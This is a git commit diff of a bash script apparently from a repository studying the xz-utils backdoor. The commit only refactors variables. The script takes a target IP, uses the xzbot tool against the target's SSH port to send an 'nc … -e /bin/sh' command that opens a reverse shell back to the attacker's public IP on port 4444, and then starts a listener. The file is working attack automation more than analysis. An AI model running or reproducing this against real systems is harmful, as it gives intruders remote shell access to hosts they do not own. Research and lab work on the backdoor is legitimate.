f8261dc7fe2b856ea6347669817d70792ab6a786
ymiwm <ymiwm0322@gmail.com>
2024-05-16 16:21:13 +0900

    Last commit for reverse-shell.sh

--- Unknown/xz-utils_backdoor/attack/reverse-shell.sh
+++ Unknown/xz-utils_backdoor/attack/reverse-shell.sh
@@ -1,16 +1,17 @@
 #!/bin/bash
 
-# Set IP regex
+argument_count="${#}"
+target_address="${1}"
 ip_pattern="^([0-9]{1,3}\.){3}[0-9]{1,3}$"
 
 # Check argument
-if [[ ${#} -eq 0 ]]; then
+if [[ ${argument_count} -eq 0 ]]; then
 	echo "[-] IP address not given"
 	exit 1
-elif [[ ${#} -gt 1 ]]; then
+elif [[ ${argument_count} -gt 1 ]]; then
 	echo "[-] Too many arguments"
 	exit 1
-elif [[ ! ${1} =~ ${ip_pattern} ]]; then
+elif [[ ! ${target_address} =~ ${ip_pattern} ]]; then
 	echo "[-] Invalid IP address"
 	exit 1
 fi
@@ -18,8 +19,8 @@ fi
 echo "[+] Starting reverse shell automation"
 
 # Send nc command to establish reverse shell
-echo "[+] Send request to localhost from ${1} after 1 second"
-sleep 1 && xzbot -addr ${1}:22 -cmd "nc $(curl -s ifconfig.me) 4444 -e /bin/sh" > /dev/null 2>&1 &
+echo "[+] Send request to localhost from ${target_address} after 1 second"
+sleep 1 && xzbot -addr ${target_address}:22 -cmd "nc $(curl -s ifconfig.me) 4444 -e /bin/sh" > /dev/null 2>&1 &
 
 # Set localhost as a listener
 echo "[+] Set localhost as a listener"
